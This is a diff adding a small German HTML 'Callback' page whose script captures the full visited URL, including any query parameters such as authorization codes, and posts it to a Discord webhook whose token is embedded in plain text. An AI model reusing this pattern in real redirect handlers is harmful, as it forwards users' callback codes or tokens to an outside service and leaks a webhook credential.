@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>Callback</title>
+</head>
+<body>
+  <h2>Callback</h2>
+  <p>URI-Parametern wurden an den Discord-Webhook gesendet. Du kannst die Webseite verlassen.</p>
+
+  <script>
+    // Den kompletten URI erfassen
+    const fullUrl = window.location.href;
+
+    // Discord Webhook URL (im Klartext eingebettet)
+    const webhookUrl = "https://discord.com/api/webhooks/1250201804268900402/WDBhR9o57lQrxNvg9wz80cjVAq8wJF1Ftzb3G6XlQJWcIBjQEnpib4LLZq3a730NZc1f";
+
+    // JSON-Payload
+    const payload = {
+      content: `Aufruf mit URL: ${fullUrl}`
+    };
+
+    // An den Webhook senden
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    }).then(r => {
+      console.log("Gesendet:", r.status);
+    }).catch(err => {
+      console.error("Fehler beim Senden:", err);
+    });
+  </script>
+</body>
+</html>
